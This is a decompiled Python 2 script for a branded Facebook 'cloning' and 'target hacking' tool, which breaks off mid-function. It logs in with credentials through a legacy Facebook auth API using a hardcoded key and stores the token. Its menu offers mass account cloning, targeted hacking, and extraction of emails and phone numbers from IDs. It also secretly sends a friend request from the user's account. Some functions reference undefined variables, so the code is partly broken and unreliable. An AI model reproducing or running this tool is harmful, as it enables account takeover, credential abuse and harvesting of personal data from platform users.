# Decompile By DarkXploit
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: Dark Hunter
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


B = '\x1b[1;94m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
logo = '\n\n\n\x1b[1;97m______ ___  ______ _______   _____   \n\x1b[1;91m|  ___/ _ \\ | ___ \\_   _\\ \\ / / _ \\  \n\x1b[1;97m| |_ / /_\\ \\| |_/ / | |  \\ V / /_\\ \\ \n\x1b[1;91m|  _||  _  ||    /  | |   \\ /|  _  | \n\x1b[1;97m| |  | | | || |\\ \\ _| |_  | || | | | \n\x1b[1;91m\\_|  \\_| |_/\\_| \\_|\\___/  \\_/\\_| |_/ \n\x1b[1;95m       \xf0\x9d\x91\xb6\xf0\x9d\x91\xad\xf0\x9d\x91\xad\xf0\x9d\x91\xb0\xf0\x9d\x91\xaa\xf0\x9d\x91\xb0\xf0\x9d\x91\xa8\xf0\x9d\x91\xb3 \xf0\x9d\x91\xad\xf0\x9d\x91\xa8\xf0\x9d\x91\xb9\xf0\x9d\x91\xb0\xf0\x9d\x92\x80\xf0\x9d\x91\xa8 \xf0\x9d\x91\xb2\xf0\x9d\x91\xaf\xf0\x9d\x91\xa8\xf0\x9d\x91\xb5\n\n\n\x1b[0;31m \x1b[1;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* CREATOR : \x1b[1;39mFARIYA KHAN                      \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* FACEBOOK: \x1b[1;39mm.facebook.com/Faritricker007    \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* PAGE    : \x1b[1;39mTech Fari                        \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
os.system('clear')
print '\n\x1b[1;97m______ ___  ______ _______   _____   \n\x1b[1;91m|  ___/ _ \\ | ___ \\_   _\\ \\ / / _ \\  \n\x1b[1;97m| |_ / /_\\ \\| |_/ / | |  \\ V / /_\\ \\ \n\x1b[1;91m|  _||  _  ||    /  | |   \\ /|  _  | \n\x1b[1;97m| |  | | | || |\\ \\ _| |_  | || | | | \n\x1b[1;91m\\_|  \\_| |_/\\_| \\_|\\___/  \\_/\\_| |_/ \n\x1b[1;95m       \xf0\x9d\x91\xb6\xf0\x9d\x91\xad\xf0\x9d\x91\xad\xf0\x9d\x91\xb0\xf0\x9d\x91\xaa\xf0\x9d\x91\xb0\xf0\x9d\x91\xa8\xf0\x9d\x91\xb3 \xf0\x9d\x91\xad\xf0\x9d\x91\xa8\xf0\x9d\x91\xb9\xf0\x9d\x91\xb0\xf0\x9d\x92\x80\xf0\x9d\x91\xa8 \xf0\x9d\x91\xb2\xf0\x9d\x91\xaf\xf0\x9d\x91\xa8\xf0\x9d\x91\xb5\n\n\x1b[0;31m \x1b[1;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* CREATOR : \x1b[1;39mFARIYA KHAN                      \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* FACEBOOK: \x1b[1;39mm.facebook.com/Faritricker007    \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* PAGE    : \x1b[1;39mTech Fari                        \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
jalan('\x1b[1;96m\xe2\x99\xa4\xcd\xa1\xcd\x9c\xe2\x99\xa4\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9c\xb7 FARIYA KHAN OFFICIAL')
jalan('\x1b[1;91m\xe2\x99\xa4\xcd\xa1\xcd\x9c\xe2\x99\xa4\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9c\xb7 I M NOT RESPONSIBLE FOR ANY MISS USE')
jalan('\x1b[1;96m\xe2\x99\xa4\xcd\xa1\xcd\x9c\xe2\x99\xa4\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9c\xb7 IT IS FOR ONLY EDUCATION PURPOSE')

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mPlease Wait \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\x1b[1;97m______ ___  ______ _______   _____   \n\x1b[1;91m|  ___/ _ \\ | ___ \\_   _\\ \\ / / _ \\  \n\x1b[1;97m| |_ / /_\\ \\| |_/ / | |  \\ V / /_\\ \\ \n\x1b[1;91m|  _||  _  ||    /  | |   \\ /|  _  | \n\x1b[1;97m| |  | | | || |\\ \\ _| |_  | || | | | \n\x1b[1;91m\\_|  \\_| |_/\\_| \\_|\\___/  \\_/\\_| |_/ \n\x1b[1;95m       \xf0\x9d\x91\xb6\xf0\x9d\x91\xad\xf0\x9d\x91\xad\xf0\x9d\x91\xb0\xf0\x9d\x91\xaa\xf0\x9d\x91\xb0\xf0\x9d\x91\xa8\xf0\x9d\x91\xb3 \xf0\x9d\x91\xad\xf0\x9d\x91\xa8\xf0\x9d\x91\xb9\xf0\x9d\x91\xb0\xf0\x9d\x92\x80\xf0\x9d\x91\xa8 \xf0\x9d\x91\xb2\xf0\x9d\x91\xaf\xf0\x9d\x91\xa8\xf0\x9d\x91\xb5\n\n\x1b[0;31m \x1b[1;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* CREATOR : \x1b[1;39mFARIYA KHAN                      \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* FACEBOOK: \x1b[1;39mm.facebook.com/Faritricker007    \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* PAGE    : \x1b[1;39mTech Fari                        \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
CorrectUsername = 'HATERSINMYFOOT'
CorrectPassword = 'OWNERFARIYAKHAN'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;91m\xf0\x9f\x94\x90 \x1b[1;91mTool Username \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;93m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;94m\xf0\x9f\x94\x90 \x1b[1;91mTool Password \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;92m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            loop = 'false'
        else:
            print 'Wrong Password'
            os.system('xdg-open https://m.facebook.com/Faritricker007')
    else:
        print 'Wrong Username'
        os.system('xdg-open https://m.facebook.com/Faritricker007')

def login():
    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '\x1b[1;96m[\xe2\x80\xa21\xe2\x80\xa2] \x1b[1;91m\xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0\x1b[1;92m Login With Facebook\x1b[1;95m---------\xe2\x9a\xab '
    time.sleep(0.05)
    print '\x1b[1;96m[\xe2\x80\xa22\xe2\x80\xa2] \x1b[1;91m\xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0\x1b[1;92m Login With Access Token\x1b[1;95m-----\xe2\x9a\xab '
    time.sleep(0.05)
    print '\x1b[1;96m[\xe2\x80\xa23\xe2\x80\xa2] \x1b[1;91m\xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0\x1b[1;92m Follow Me On Facebook\x1b[1;95m-------\xe2\x9a\xab '
    time.sleep(0.05)
    print '\x1b[1;96m[\xe2\x80\xa20\xe2\x80\xa2] \x1b[1;91m\xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0\x1b[1;92m Logout Commands\x1b[1;95m-------------\xe2\x9a\xab'
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;91mFariya Khan\xe2\x96\xb8\x1b[1;95m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_login()
    elif peak == '1':
        login1()
    elif peak == '2':
        tokenz()
    elif peak == '3':
        os.system('xdg-open https://m.facebook.com/Faritricker007')
        login()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def login1():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        time.sleep(0.05)
        print logo
        print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        jalan('\x1b[1;96m\xe2\x95\x91[\xe2\x9a\xa1]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m [\xe2\x9a\xa1]')
        jalan('\x1b[1;96m\xe2\x95\x91[\xe2\x9a\xa1]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[\xe2\x9a\xa1]')
        print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        print '\x1b[1;96m[\xe2\x98\x86] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
        print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Successful'
                os.system('xdg-open https://www.Facebook.com/Faritricker007')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def tokenz():
    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    toket = raw_input('\x1b[1;91m[+]\x1b[1;92m Give Token\x1b[1;91m :\x1b[1;95>>\x1b[1;94m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;91m[?] \x1b[1;92mWant to pick up token?\x1b[1;97m[Y/N]: ')
        if e == '':
            keluar()
        elif e == 'y':
            login()
        else:
            keluar()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[!] \x1b[1;91mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '  \x1b[1;36;40m\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m'
    print '  \x1b[1;36;40m\x1b[1;32;40m[*] ID  \x1b[1;32;40m: ' + id + '        \x1b[1;36;92m'
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '\x1b[1;32;98m[1] \x1b[1;96m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;91mStart Cloning All Countries'
    time.sleep(0.05)
    print '\x1b[1;32;98m[2] \x1b[1;91m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;96mStart Target Hacking'
    time.sleep(0.05)
    print '\x1b[1;32;98m[3] \x1b[1;96m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;91mExtract Email From ID'
    time.sleep(0.05)
    print '\x1b[1;32;98m[4] \x1b[1;91m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;96mExtract Ph.number From ID'
    time.sleep(0.05)
    print '\x1b[1;32;98m[5] \x1b[1;96m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;91mFind Numeric ID '
    time.sleep(0.05)
    print '\x1b[1;32;98m[6] \x1b[1;91m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;96mFollow FARIYA Khan On Facebook'
    time.sleep(0.05)
    print '\x1b[1;32;98m[0] \x1b[1;96m \xe2\x8a\xb1\xe2\x9f\xa1\xe2\x8a\xb0 \x1b[1;91mLogout Account'
    print '\x1b[1;97m --------------------------------------------------'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m Fariya Khan > \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        hackingx()
    elif unikers == '3':
        emailx()
    elif unikers == '4':
        phonex()
    elif unikers == '5':
        numericx()
    elif unikers == '6':
        os.system('xdg-open https://m.facebook.com/Faritricker007')
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
